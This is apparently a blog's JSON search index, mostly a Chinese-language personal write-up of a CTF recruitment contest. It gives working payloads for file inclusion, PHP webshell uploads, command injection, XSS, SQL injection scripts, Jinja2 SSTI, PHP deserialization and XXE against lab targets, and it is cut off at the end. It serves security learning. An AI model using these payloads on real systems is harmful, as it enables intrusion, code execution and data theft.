[{"title":"Hello World","url":"/2024/11/26/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n"},{"title":"友链","url":"/2024/11/02/%E5%8F%8B%E9%93%BE/","content":"既见大佬为何不拜（Narcher ：前辈&amp;学长，超哥.nryhzqyyetcc{zoom:20%;}\n\nhttps://narcheralter.github.io/\nieu ：web领域大神，硬件竞赛大佬，精通C&#x2F;C艹&#x2F;Python，手残党.umkcjmgwodmj{zoom:30%;}\n\nwww.ieu-space.online\nzjy ：全领域大佬，究极CTF做题家，很难想象这样的生物存在于战场之上.pdyussvmyibo{zoom:30%;}\n\nhttps://www.cnblogs.com/zhln/p/18423335 (temp)\nH3 ：网络安全领域大神，看就完了.ijkvgwgypudc{zoom:30%;}\n\nhttps://github.com/H3rmesk1t/\nShad0wWalker ：学长&amp;前辈，竞赛佬，影子走路人，“和蔼”.pqcsuvkqkdwv{zoom:20%;}\n\nhttps://shad0wwalker.com/\nSake ：前辈&amp;学长，高冷范?.cvypieixjpgt{zoom:13%;}\n\nhttps://sakee.cn/\n这是缪缪，她很可爱.remnsjvpxllf{zoom:13%;}\n\nhttps://mczd2.github.io/\n","tags":["分享","友链"]},{"title":"御林招新赛个人wp","url":"/2024/11/28/%E5%BE%A1%E6%9E%97%E6%8B%9B%E6%96%B0%E8%B5%9B%E4%B8%AA%E4%BA%BAwp/","content":"BASIC布什戈门，你管这叫basic（ ——9.26\n好吧跟那一帮群魔乱舞比起来和善多了——10.24\nENCODE四串分别对应四种加密&#x2F;编码方式\n014380f217e124ad3213bcbf3cb794f4 —–MD5加密\n%53%65%63%7b%77%65%5f%6d%75%35%74%5f%6b%6e%30%77 —–URL编码\nX2MwbW0wbg&#x3D;&#x3D; —–base64编码\n&amp;#95&amp;#101&amp;#110&amp;#99&amp;#48&amp;#100&amp;#49&amp;#110&amp;#103&amp;#115&amp;#125 —–HTML实体编码\n（话说好像根本不需要解第一串欸）\nCALC-1小学生都知道6*11&#x3D;66，但是只能输入一个字符\n众所周知，我输入≠服务器接收\nBurpSuite拦截抓包修改结果为66，完成\nCALC-2小学生也知道600+60+6&#x3D;666，但实际上无论输入什么都会弹出“禁止666!”\n看源代码可以得知当check返回true时输入的内容才可能被上传\n若要改false为true，惟能把网站的文件用本地文件替换（顺便把弹窗代码删了）\n替换后输入666，得到flag\n【hackbar POST 也可以……】\nCALC-3题目代码实际是让人类在两秒内算出两个随机数的和\n写个jio本用正则表达式爬取两个数字并计算和，加入获取到的cookie，然后post就好了，非常简单？\nerror0：把数字变量当成字符串拼接\nerror1：不加cookie\nerror2：忘了接收数据\nHTTP题目要GET，就写脚本给它GET\n题目要POST，就写脚本给他POST\n由于POST和GET当时没有hackbar不会一起用，转而使用***&#x2F;?key1&#x3D;YulinSec\n要求从YulinSec:&#x2F;&#x2F;127.0.0.1访问，在字典中加入”referer”:”YulinSec:&#x2F;&#x2F;127.0.0.1”\n最后要求是admin，在headers中发现有”Set-Cookie”:”admin&#x3D;0”，在字典中额外写入”Cookie”:”admin&#x3D;1”,（记得加逗号），在header里找到flag\n302相对好查找解决方法的一题\n做题时看到302重定向到自己一头雾水，于是尝试拦截\n使用脚本，把url改成***yulinsec.cn&#x2F;302.php，加入allow_redirects&#x3D;False拦截重定向，成功从响应里找到flag\nHTTPS翻看headers找到一串被加密的cookie\n丢给CMD5工具（www.cmd5.com），得出其类型是Json Web Token\n丢给JWT解密工具发现playload里”admin“&#x3D;“0”\n将JWT解码的cookie改为”admin“&#x3D;“1”后封装进python，找到flag\nLocal File Inclusion①第一题是真正的送分题。根据提示在phpinfo中改成file&#x3D;flag.php即可\n②flag在‘某个文件’里，那么在哪呢\nurl=http://prob00-20d19db9337f51b8d01170e045f50620.recruit.yulinsec.cn/?file=php://input 再POST提交&lt;?phpsystem(&quot;ls&quot;);?&gt;\n访问出现的flag_xxx得到flag\n③input寄了，于是采用?file=data://text/plain,&lt;?php system(&quot;ls&quot;);?&gt;\n访问出现的flag_xxx得到flag\n④data也寄了，于是用?file=php://filter/convert.base64-encode/resource=flag.php找flag\n获得base64编码的flag\n⑤根据源码提示，用burpsuite抓包写入I want flag，出现flag\n⑥提示了上传和’zip’，并且发现phpinfo页面的url没有.php后缀，随后确认代码会自动’帮‘我们加.php\n利用phar函数，提交…………recruit.yulinsec.cn/index.php/?file=phar://./uploads/这是一串名字.zip/hak在index里把马提出来，链接蚁剑找到flag\n也可以在🐎里写入ls，看到flag的位置，包含得到flag\n话说这个源码里注释了过滤phar的部分……那就是说不用phar也能做？\n⑦能用的伪协议都寄了，于是用在源码里提示的session文件\n查找得知session文件的名称与sessionid有关，于是自己在cookie里设置PIPSESSID&#x3D;114514，同时在a里设置要执行的php命令（一句话木马）\n在phpinfo里确认路径为&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions\n提交?a=&lt;?php @eval($_POST[&#39;a&#39;]);echo * ?&gt; &amp;file=/var/lib/php/sessions/sess_114514，蚁剑链接后找到flag\n文件上传①第一题名字叫js绕过，故尝试关闭js后上传一句话木马，成功连接到服务器\n②第二题提示是.htaccess，于是写一个.htaccess文件 ，让它帮我们把jpg以php解析\n怎么会有人保存为了a.htaccess啊（\n③第三题提示是MIME绕过，复制图片content-type的image&#x2F;jpeg到php木马中\n④第四题需要文件头绕过，利用一个正常的png的头，在上传时抓包写入木马，并改后缀为php\n⑤第五题上传木马后发现php被删除采用双写后缀pphphp绕过\n⑥第六题类似，但是删完会留一个空格，不能双写，采用大写绕过\n⑦第七题源码显示它使用get方法去获得路径上传jpg格式的一句话木马，在Upload&#x2F;后接name.php把文件以PHP保存\n⑧第八题与第七题类似（甚至长得都差不多），不过改用POST。也是在Upload&#x2F;接name.php与截断。截断的目的是防止被保存路径里那一坨搞失效\n⑨第九题是黑名单缺陷，改成黑名单里没有的.php3即可\n⑩第十题的条件竞争，用一个intruder上传大马，另一个intruder访问大马，手动访问小马并蚁剑链接得到flag\n⑪第十一题的hint讲的很全面：先传一个gif再下载下来，找到相同的地方插入木马\n⑫花样百出の后缀\n在名字处填写1.php&#x2F;.，利用move_uploaded_file不识别&#x2F;的缺陷绕过\n⑬十三题的代码逻辑大致上是先判断mime，再用数组查文件名，然后将数组的首位（一般是文件的名称）与n-1位（一般是后缀）拼接。\n在save_name后面接[0]让它成为一个数组从而自定义其中的项，使得count-1返回的项与白名单中的元素不同\n最终在包里呈现结果如下：\nContent-Type: image/png-----------------------------Content-Disposition: form-data; name=&quot;save_name[0]&quot;1919-----------------------------Content-Disposition: form-data; name=&quot;save_name[2]&quot;php-----------------------------Content-Disposition: form-data; name=&quot;save_name[114]&quot;jpg\n\n此时数组里有三个元素：用于通过白名单检测的jpg，位于第’3-1’项的后缀php与文件名1919.最终上传1919.php\nRCE⓪第0题没有过滤，直接ip=1.1.1.1|cat /flag即可\n现成试验田（确信）\n①第一题过滤表：\n| &amp; ; $ &#39;&#39;过滤命令分隔符\n在burp里抓改包\nip=1.1.1.1%0acat /flag\n②第二题过滤表：\n$ \\ (反引号) &#39;&#39; &quot;&quot; - cat more less head tac tail nl od vi ls sort uniq file bash grep rev stings curl decode sh过滤……一坨\nfind确认flag.php在当前目录下\nip=1.1.1.1|base64 flag.php\n③第三题过滤表：\n$ （反引号）&#39;&#39; &quot;&quot; / [] - cat more less head tac tail od vi ls uniq bash grep rev stings curl decode shbase64\nip&#x3D;1.1.1.1|echo *发现flag不在当前目录\n由于 &#x2F; 被过滤，选择暴力堆叠 cd.. 回到根目录\nip=1.1.1.1&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;sort flag\n是不是太多了\n④第四题过滤……表？\necho\n将ls输出的结果作为输入传给tee，写入到1.txt里\nip=1.1.1.1| ls / | tee 1.txt\n包含确认flag的位置后用类似的方法得到flag\nXSS①第一题只有URL可能造成弹窗，且源代码中有”find the name“提示\n在URL中写入\n?name=&lt;script&gt;alert(114)&lt;/script&gt;\n②第二题转换了&lt;&gt;与”\n使用不含被过滤符号的语句绕过\n（当然要先闭合value）\n&#39;onfocus=alert(114) x=&#39; \n虽然在弹窗触发前就搞到flag了（\n③第三题与第二题类似，将 ‘ 换为 “ 即可\n&quot;onfocus=alert(114) x=&quot;\n④第四题分隔了on与script，同时大小写也无法绕过\n查B站大学得知可以自己加一个元素创造alert，从而避免在value中被过滤（？）\n&quot;&gt;&lt;a href=javascript:alert(114)&gt;Clickme&lt;/a x=&quot;\n⑤第五题过滤删除了script，闭合value并双写绕过即可\n&quot;&gt;&lt;scrscriptipt&gt;alert(114)&lt;/scrscriptipt&gt;\n⑥第六题分隔了href，script并在value处实体化&lt;&gt;\n实体编码，启动！\njava&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(114)\n⑦第七题没有明显的输入位置且&lt;&gt;被过滤翻看源码并用***.php?t_link=djwcb1&amp;t_history=djwcb2&amp;t_sort=djwcb3尝试更改被隐藏的值\n发现t_sort有变化，于是尝试在t_sort中植入按钮t_sort=&quot;onclick=alert(114) type=&quot;button&quot;&quot;\n找到flag\nSQLINarcher sama官方认证的教程欸\n①union联合注入\n提交?id=1 and 1=2可以正常显示，说明是数字型注入\n提交?id=4 group by 4报错而2，3可以，说明这个表有三列\n提交?id=0 union select 1,114514,1919810发现后两位有回显\n提交?id=0 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()在information_schema库里的看到叫flag的表\n提交?id=0 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#39;flag&#39;在当前库里找到表flag\n提交?id=0 union select 1,flag,3 from flag获取flag\n②报错注入——extractvalue\n提交?id=4 group by 4报错说明表还是有三列\n提交?id=0 union select 1,2,extractvalue(114,concat(0x7e,(select database())))看到库名security\n提交?id=1 union select 1,2,sthnotexist()也可以看到库名security\n后续模板：?id=0 union select 1,2,extractvalue(114,concat(0x7e,(【模板】))\n提交?id=0 union select 1,2,extractvalue(114,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))看到叫flag的表\n提交?id=0 union select 1,2,extractvalue(114,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;flag&#39;)))找到表flag\n提交?id=0 union select 1,2,extractvalue(114,concat(0x7e,(select flag from flag)))获取flag，但是flag太长了看不全，只能看到前32个字符\n提交?id=0 union select 1,2,extractvalue(114,concat(0x7e,(select substring(flag,24,30) from flag)))让它显示从24位开始的最多30位（避免漏掉中间部分），拼接得到完整flag\n所以floor报错真就得 ?1……01 才能报错，中间还不能有00，哪个人才程序猿想出来的统计方式\n③提交?id=1 and 1=1与?id=1 and 1=2，前者返回OK（真）后者无回显（假）\n事已至此，写脚本吧\nimport requestsdef fetch_url(url):    try:        response = requests.get(url)        response.raise_for_status()  # 检查请求是否成功    except requests.exceptions.RequestException as e:        print(f&quot;请求出错: &#123;e&#125;&quot;)n=0base_url = &quot;http://prob00-012.recruit.yulinsec.cn/?id=1 and ascii(substr((select flag from flag limit 0,1),&quot;ascii_dict=&#123;&#125;while n&lt;100:    n=n+1    i=64    min=1    max=128    while i&gt;1:        url = base_url + str(n) + &#x27;,1))&gt;=&#x27; + str(i)        #print(url)        fetch_url(url)        response = requests.get(url)        if(&#x27;OK&#x27; in response.text):#如果第一次有ok，说明i&gt;=?            i=i+1            fetch_url(url)             resp = requests.get(url)            i=i-1            if(max==i or min==i):                ascii_dict[str(n)]=i                print(&quot;gotit&quot;,i,&#x27;————&#x27;,n)                 break            elif(&#x27;OK&#x27; in resp.text):                 min=i                i=(i+max)//2 #如果?&gt;=i-1,还有ok，说明i太小了            else:                ascii_dict[str(n)]=i                print(&quot;gotit&quot;,i,&#x27;————&#x27;,n) #如果?&gt;=1但是?&lt;i-1，说明?=i                break        else:#没有OK，说明i太大了            max=i            i=(i+min)//2    if(i&lt;=1):        print(&quot;真的……一个字符……都没有了…………&quot;)        breakprint(&quot;才&quot;,n-1,&quot;个字符就不行了吗，杂鱼杂鱼&quot;)result = &#123;key: chr(value) for key, value in ascii_dict.items()&#125;values_list = list(result.values())output_string = &#x27;&#x27;.join(values_list)print(output_string)\n\n用此原始脚本找到数据库名字确认当前库security\nbase_url&#x3D;http://prob00-012.recruit.yulinsec.cn/?id=1 and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#39;flag&#39; limit 1,1),找到flag\nbase_url &#x3D; &quot;http://prob00-012.recruit.yulinsec.cn/?id=1 and ascii(substr((select flag from flag limit 0,1),&quot;获取flag  下次能不能别写这么长的flag\n④现在页面没有真假状态区分了，需要用sleep()函数判断代码是否正常执行\n提交?id=1 and sleep(3)页面等待约3秒刷新，说明是数字型\n改jio本\n选择遍历一定不是因为2分法出bug了（\nimport requestsdef fetch_url(url):    try:        response = requests.get(url,timeout=0.5)        response.raise_for_status()  # 检查请求是否成功        return response    except requests.exceptions.RequestException as e:        #print(f&quot;请求出错: &#123;e&#125;&quot;)        return Nonen=0base_url = &quot;http://prob00-013.recruit.yulinsec.cn/?id=1 and if(ascii(substr((select flag from flag limit 0,1),&quot;ascii_dict=&#123;&#125;while n&lt;100:    n=n+1    i=128    while i&gt;0:        url = base_url + str(n) +  &#x27;,1))&gt;=&#x27; + str(i) + &#x27;,sleep(10),sleep(00))&#x27;        #print(url)        response = fetch_url(url)        if response is None:#超时代表条件为真，?&gt;=i            print(&quot;gotit&quot;,i,&#x27;————&#x27;,n)            ascii_dict[str(n)]=i            break        else:            i=i-1    if(i&lt;=0):        print(&quot;真的……一个字符……都没有了…………&quot;)        breakprint(&quot;才&quot;,n-1,&quot;个字符就不行了吗，杂鱼杂鱼&quot;)result = &#123;key: chr(value) for key, value in ascii_dict.items()&#125;values_list = list(result.values())output_string = &#x27;&#x27;.join(values_list)print(output_string)\n\n快进到找flag\n⑤第五题过滤了union select or and ()  &amp; | （非末尾的?空格??）--+ %23 %20并且注释符无法绕过\n提交?id=1&quot;出现&quot;1&quot;&quot;)) LIMIT 0,1报错，确认为字符型\n尝试” “) “)) “)))，在加上第三个或更多括号时报错信息会出现这些额外的括号，得知闭合方式((”“)）\n空格利用%09绕过，关键字采用大写绕过\n为了把后面的”))注释掉，采用–%09-的方式结尾\n提交?id=0&quot;))%09Union%09Select%091,2,flag%09from%09flag--%09-获取flag\n⑥提交?id=0 union select 1,group_concat(flag),3 from flag发现flag不在这里\n提交id=0 union select 1,2,@@datadir–&gt;&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;\n提交?id=0 union select 1,2,&quot;&lt;?php @eval($_POST[&#39;a&#39;]);?&gt;&quot; into outfile &quot;/var/lib/mysql/1.php&quot;--+写个🐎\n连接成功。\n在服务器里发现了一堆马，也就是说理论上不用上传也“能做”？后悔自己的马写的太简单了\n⑦感觉好像……过于简单了？\n和第一题完全一样？？？？？？？？\n（除了要用POST）\n⑧首先试图区分字符与数字型但发现没有用\n查询得知宽字节绕过需要在 “  ‘ 前加上%df，在GBK中会变成%df%5c，合成一个汉字从而失去\\的转义作用\n试出闭合方式为””\n快进到?id=0%df&quot; union select 1,group_concat(flag),3 from flag--+获取flag\nSSTI前置工作：在globals里找到os_wrap_close为第128位，在0起始就用127表示。post提交的数据名为text\n①No waf\n&#123;&#123;''.__class__.__base__.__subclasses__()[127].__init__.__globals__['popen']('cat /flag').read()&#125;&#125;\n②双大括号\n&#123;% print(''.__class__.__base__.__subclasses__()[127].__init__.__globals__[\"popen\"](\"cat /flag\").read()) %&#125;\n③中括号\n&#123;&#123;''.__class__.__base__.__subclasses__().__getitem__(127).__init__.__globals__.__getitem__('popen')('cat /flag').read()&#125;&#125;\n④下划线\ntext=&#123;&#123;''|attr(request.args.class)|attr(request.args.base)|attr(request.args.subclasses)()|attr(request.args.getitem)(127)|attr(request.args.init)|attr(request.args.globals)|attr(request.args.getitem)('popen')('cat /flag')|attr('read')()&#125;&#125;——payload\nhttp://prob00-021.recruit.yulinsec.cn/?class=__class__&amp;base=__base__&amp;subclasses=__subclasses__&amp;getitem=__getitem__&amp;init=__init__&amp;globals=__globals__——url\n⑤引号\n&#123;&#123;().__class__.__base__.__subclasses__()[127].__init__.__globals__[request.args.popen](request.args.cmd).read()&#125;&#125;\n⑥小数点\n&#123;&#123;()['__class__']['__base__']['__subclasses__']()[127]['__init__']['__globals__']['popen']('cat /flag')['read']()&#125;&#125;——法1\n&#123;&#123;()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(127)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen')('cat /flag')|attr('read')()&#125;&#125;——-法2\n⑦关键词\n&#123;&#123;()['__cl'+'ass__']['__ba'+'se__']['__subc'+'lasses__']()[127]['__in'+'it__']['__glob'+'als__']['po'+'pen']('cat /flag')['read']()&#125;&#125;\n⑧构造过程中发现不能直接出现斜线……尝试拼接%2f又发现不能直接用%，（一番激烈的STFW与拷打后）用urlencode获取后直接拼接%2f还是不能正常显示。\n尝试使用%c47，结果发现构造的47是字符串。\n尝试使用set xie=%bc~((ssq)|int)，但蹦出来%c47是真的绷不住\n改成set xie=bc%((ssq)|int)可以显示&#x2F;\n查询得到：%c是一个格式化字符串，用于将一个整数转换为其对应的ASCII字符。在Jinja2中，%操作符会将右侧的值（ssq，47）传递给左侧的格式化字符串（%c）\n基础：&#123;&#123;()|attr(&#x27;__class__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)()|attr(&#x27;__getitem__&#x27;)(127)|attr(&#x27;__init__&#x27;)|attr(&#x27;__globals__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;popen&#x27;)(&#x27;cat /flag&#x27;)|attr(&#x27;read&#x27;)()&#125;&#125;获取数字：&#123;% set two=dict(aa=a)|join|count %&#125;————————————————————————————————————————————————获得2&#123;% set nine=dict(aaaaaaaaa=a)|join|count %&#125;————————————————————————————————————————获得9&#123;% set ten=dict(aaaaaaaaaa=a)|join|count %&#125;————————————————————————————————————————获得10&#123;% set eighteen=nine+nine %&#125;———————————————————————————————————————————————————————获得18&#123;% set ssq=ten+ten+eighteen+nine %&#125;————————————————————————————————————————————————获得47&#123;% set zero=nine-nine %&#125;———————————————————————————————————————————————————————————获得0&#123;% set wrap=ten*ten+nine+eighteen %&#125;获取魔术方法、符号与命令：&#123;% set pop=dict(pop=a)|join %&#125;—————————————————————————————————————————————————————获得pop，用于获取空格与_&#123;% set xhx=(lipsum|string|list)|attr(pop)(eighteen) %&#125;——————————————————————-——————获得_&#123;% set kg=(lipsum|string|list)|attr(pop)(nine) %&#125;——————————————————————————————————获得空格&#123;% set bfh=(lipsum|string|urlencode|list)|attr(pop)(zero) %&#125;———————————————————————获得%，用于合成%c构建/&#123;% set c=dict(c=a)|join %&#125;—————————————————————————————————————————————————————————获得c，用于合成%c构建/&#123;% set bc=(bfh,c)|join %&#125;——————————————————————————————————————————————————————————合成%c&#123;% set xie=bc%((ssq)|int) %&#125;———————————————————————————————————————————————————————构建/&#123;% set cla=dict(class=a)|join %&#125;———————————————————————————————————————————————————（因为一起写会报错QwQ）&#123;% set class=(xhx,xhx,cla,xhx,xhx)|join %&#125;—————————————————————————————————————————获得__class__&#123;% set bas=dict(base=a)|join %&#125;&#123;% set base=(xhx,xhx,bas,xhx,xhx)|join %&#125;——————————————————————————————————————————获得__base__&#123;% set sub=dict(subclasses=a)|join %&#125;&#123;% set subclasses=(xhx,xhx,sub,xhx,xhx)|join %&#125;————————————————————————————————————获得__subclasses__&#123;% set get=dict(getitem=a)|join %&#125;&#123;% set getitem=(xhx,xhx,get,xhx,xhx)|join %&#125;———————————————————————————————————————获得__getitem__&#123;% set ini=dict(init=a)|join %&#125;&#123;% set init=(xhx,xhx,ini,xhx,xhx)|join %&#125;——————————————————————————————————————————获得__init__&#123;% set glo=dict(globals=a)|join %&#125;&#123;% set globals=(xhx,xhx,glo,xhx,xhx)|join %&#125;———————————————————————————————————————获得__globals__&#123;% set popen=dict(popen=a)|join %&#125;—————————————————————————————————————————————————获得popen&#123;% set cat=dict(cat=a)|join %&#125;&#123;% set flag=dict(flag=a)|join %&#125;&#123;% set cmd=(cat,kg,xie,flag)|join %&#125;———————————————————————————————————————————————组合cat /flag&#123;% set read=dict(read=a)|join %&#125;———————————————————————————————————————————————————获得read()&#123;&#123;lipsum|attr(class)|attr(base)|attr(subclasses)()|attr(getitem)(wrap)|attr(init)|attr(globals)|attr(getitem)(popen)(cmd)|attr(read)()&#125;&#125;\n\n\n\n⑨在原本基础上把class、init与+换掉\n&#123;% set two=dict(aa=a)|join|count %&#125;&#123;% set nine=dict(aaaaaaaaa=a)|join|count %&#125;&#123;% set ten=dict(aaaaaaaaaa=a)|join|count %&#125;&#123;% set eighteen=nine*two %&#125;&#123;% set ssq=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count %&#125;&#123;% set zero=nine-nine %&#125;&#123;% set wrap=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count %&#125;不对啊我为什么不直接用数字&#123;% set pop=dict(pop=a)|join %&#125;&#123;% set xhx=(lipsum|string|list)|attr(pop)(eighteen) %&#125;&#123;% set kg=(lipsum|string|list)|attr(pop)(nine) %&#125;&#123;% set bfh=(lipsum|string|urlencode|list)|attr(pop)(zero) %&#125;&#123;% set c=dict(c=a)|join %&#125;&#123;% set bc=(bfh,c)|join %&#125;&#123;% set xie=bc%((ssq)|int) %&#125;&#123;% set cla=dict(cla=a)|join %&#125;&#123;% set ss=dict(ss=a)|join %&#125;&#123;% set clas=(xhx,xhx,cla,ss,xhx,xhx)|join %&#125;&#123;% set bas=dict(base=a)|join %&#125;&#123;% set base=(xhx,xhx,bas,xhx,xhx)|join %&#125;&#123;% set subcla=dict(subcla=a)|join %&#125;&#123;% set sses=dict(sses=a)|join %&#125;&#123;% set sub=(xhx,xhx,subcla,sses,xhx,xhx)|join %&#125;&#123;% set get=dict(getitem=a)|join %&#125;&#123;% set getitem=(xhx,xhx,get,xhx,xhx)|join %&#125;&#123;% set in=dict(in=a)|join %&#125;&#123;% set it=dict(it=a)|join %&#125;&#123;% set ini=(xhx,xhx,in,it,xhx,xhx)|join %&#125;&#123;% set glo=dict(globals=a)|join %&#125;&#123;% set globals=(xhx,xhx,glo,xhx,xhx)|join %&#125;&#123;% set popen=dict(popen=a)|join %&#125;&#123;% set cat=dict(cat=a)|join %&#125;&#123;% set flag=dict(flag=a)|join %&#125;&#123;% set cmd=(cat,kg,xie,flag)|join %&#125;&#123;% set read=dict(read=a)|join %&#125;&#123;&#123;lipsum|attr(clas)|attr(base)|attr(sub)()|attr(getitem)(wrap)|attr(ini)|attr(globals)|attr(getitem)(popen)(cmd)|attr(read)()&#125;&#125;\n\n\n\n只会一题的pwnflag龙from pwn import *import re# 设置目标 IP 和端口host = &#x27;101.35.209.40&#x27;port = 11009p = remote(host,port)x=0def receive_data():    received_data = p.recvuntil(&#x27;$&#x27;)    data=received_data.decode(&#x27;utf-8&#x27;).strip()    print(data)    return datatry:    receive_data()    p.sendline(&quot;status&quot;.encode(&#x27;utf-8&#x27;))    res = receive_data()    player=re.findall(r&#x27;\\[\\w+\\]&#x27;, res)    print(player)    i=0    p.sendline(&quot;1&quot;)#防止receive_data()收不到消息卡死    while &quot;恭喜你&quot; not in receive_data(): #攻击形态        p.sendline(str(player[i%3])+&quot; heal &quot;+ str(player[(i+1)%3]))        receive_data()        i+=1        p.sendline(str(player[i%3])+&quot; heal &quot;+ str(player[(i+1)%3]))        receive_data()        i+=1        p.sendline(str(player[i%3])+&quot; heal &quot;+ str(player[(i+1)%3]))        receive_data()        i+=1        p.sendline(str(player[i%3])+&quot; attack&quot;)        i+=1    p.interactive() #转人工except KeyboardInterrupt:    print(&quot;连接已关闭&quot;)# 关闭连接p.close()\n\n逃避可耻但有(?)用，直接无视flag龙打1走3（\nPHP反序列化（现阶段）手搓不比构造代码快（\n（下文均为未base64编码版本）\n首先找到注入点system，可以利用它执行系统命令\n首先通过php弱类型MD5比较：诸如aabC9RqS之类MD5后0e开头的字符串在参与比较时会被当成科学计数法从而变成0\n推测魔术方法触发顺序：__destruct() -&gt; ___tostring() -&gt; __get() -&gt; __invoke() -&gt; (command)\n推测每一个对象所属的类：被反序列化的对象ser是类F,其user属性为aabC9RqS，notes属性是类T的对象，类T对象sth是类C的对象，类C对象的属性manba是类YULIN的对象，类YULIN的属性cmd是要执行的命令\n构造基础：O:1:”F”:2:{s:4:”user”;s:8:”aabC9RqS”;s:5:”notes”;O:1:”T”:1:{s:3:”sth”;O:1:”C”:1:{s:5:”manba”;O:5:”YULIN”:1:{s:3:”cmd”;s:2:”ls”;}}}}\n但是发现没有执行预期的ls命令\n原来是 byd __wakeup()，虽然反序列化的主题是类F的对象，但是其中包含类YULIN的对象，于是也会触发__wakeup()          ……?\n搜索wakeup绕过，得知“当反序列化字符串中，表示属性个数的值大于真实属性个数时，会跳过 __wakeup() 函数的执行，是因为 PHP 在反序列化过程中，会忽略掉多出来的属性，而不会对这些属性进行处理和执行”\n变更为O:1:”F”:114:{s:4:”user”;s:8:”aabC9RqS”;s:5:”notes”;O:1:”T”:1:{s:3:”sth”;O:1:”C”:1:{s:5:”manba”;O:5:”YULIN”:1:{s:3:”cmd”;s:2:”ls”;}}}}看到flag.php\n使用O:1:”F”:114:{s:4:”user”;s:8:”aabC9RqS”;s:5:”notes”;O:1:”T”:1:{s:3:”sth”;O:1:”C”:1:{s:5:”manba”;O:5:”YULIN”:1:{s:3:”cmd”;s:12:”cat &#x2F;flag.php”;}}}}得到……源码里的flag\nbackdoor①根据题目直接连接prob00-032.recruit.yulinsec.cn&#x2F;index.php，连接密码为yulin\n②在原有的马的基础上添加了一句base64_decode，代表对传入yulin的值额外进行了一次base64解码，直接连yulin连不上。\n在post提交的头里赋值yulin为base64编码的@eval($_POST[&#39;a&#39;]);,让小明的马变成&lt;?php @eval(@eval($_POST[&#39;a&#39;]););?&gt;，以a连入backdoor\n或者改变蚁剑的默认编码器，不让他base64_encode，直接连小明的马进入backdoor\n③根据题里的“disable_functions”，下载同名的蚁剑扩展，cd到根目录后&#x2F;getflag得到flag\n调查问卷非常好火狐，使我Priority: u&#x3D;0，爱来自burpsuite\n首先根据exx判断是xxe漏洞，且flag在&#x2F;app&#x2F;fl4g2533333333.txt\n构造基础：\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY xxe SYSTEM &quot;file:///app/fl4g2533333333.txt&quot; &gt;]&gt;      &lt;root&gt;&lt;feedback&gt;&amp;xxe;&lt;/feedback&gt;      &lt;/root&gt;\n\n但是上传时发现SYSTEM和PUBLIC均被过滤，于是利用vscode将此文件编码格式与encording改成UTF-16BE，在burp里删除多出来的”þÿ“，提交，得到flag\n神经御雷真诀上增多逃逸\n上清境共分为六(?)层，分别为：ningshen  yinspirit  chu_qiao  yangshen  